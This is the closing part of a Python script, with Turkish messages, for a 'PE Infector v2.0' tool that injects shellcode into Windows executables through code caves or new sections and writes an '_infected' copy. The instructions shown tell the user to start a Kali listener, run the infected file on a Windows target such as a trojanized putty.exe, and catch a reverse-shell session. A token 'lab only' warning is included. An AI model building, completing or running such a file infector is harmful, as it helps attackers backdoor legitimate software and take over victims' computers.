    except Exception as e:
        print(f"[!] Kaydetme hatası: {e}")
        return
    
    # Rapor
    print(infector.generate_report())
    
    print("\n" + "="*60)
    print("TAMAMLANDI!")
    print("="*60)
    print(f"\n[+] Enfekte dosya: {output}")
    print(f"[+] Orijinal dosya değiştirilmedi: {target}")
    print(f"\n[*] Kullanım:")
    print(f"    1. Kali'de listener başlat (eğer reverse shell ise)")
    print(f"    2. Windows hedefte {output} dosyasını çalıştır")
    print(f"    3. Session'ı al!")
    print(f"\n[!] UYARI: Sadece lab ortamında kullanın!")


def main():
    """Ana fonksiyon"""
    parser = argparse.ArgumentParser(
        description="PE Infector v2.0 - Shellcode injection tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Örnekler:
  # İnteraktif mod
  %(prog)s
  
  # Komut satırı - kendi shellcode
  %(prog)s -t putty.exe -s payload.bin -o infected.exe
  
  # Test shellcode ile
  %(prog)s -t app.exe --test -o infected.exe
  
  # Sadece analiz
  %(prog)s -t app.exe --analyze
  
  # Yeni section ekle (code cave yoksa)
  %(prog)s -t app.exe -s payload.bin --method section
        """
    )
    
    parser.add_argument('-t', '--target', help='Hedef PE dosyası')
    parser.add_argument('-s', '--shellcode', help='Shellcode dosyası (.bin)')
    parser.add_argument('-o', '--output', help='Çıktı dosyası')
    parser.add_argument('--test', action='store_true', help='Test shellcode kullan')
    parser.add_argument('--analyze', action='store_true', help='Sadece analiz')
    parser.add_argument('--method', choices=['auto', 'cave', 'section'], 
                        default='auto', help='Enjeksiyon yöntemi')
    
    args = parser.parse_args()
    
    # Argüman yoksa interaktif mod
    if len(sys.argv) == 1:
        interactive_mode()
        return
    
    if not args.target:
        parser.print_help()
        return
    
    print_banner()
    
    try:
        infector = PEInfector(args.target)
        infector.analyze_sections()
        
        if args.analyze:
            infector.find_code_caves()
            return
        
        # Shellcode yükle
        if args.test:
            if infector.is_64bit:
                infector.load_shellcode(shellcode_bytes=create_test_shellcode_x64())
            else:
                infector.load_shellcode(shellcode_bytes=create_test_shellcode_x86())
        elif args.shellcode:
            infector.load_shellcode(shellcode_path=args.shellcode)
        else:
            print("[!] Shellcode gerekli: -s veya --test")
            return
        
        # Enjeksiyon
        infector.inject(method=args.method)
        
        # Doğrulama
        infector.verify()
        
        # Kaydet
        output = args.output
        if not output:
            base, ext = os.path.splitext(args.target)
            output = f"{base}_infected{ext}"
        
        infector.save(output)
        print(infector.generate_report())
        
    except Exception as e:
        print(f"\n[!] HATA: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
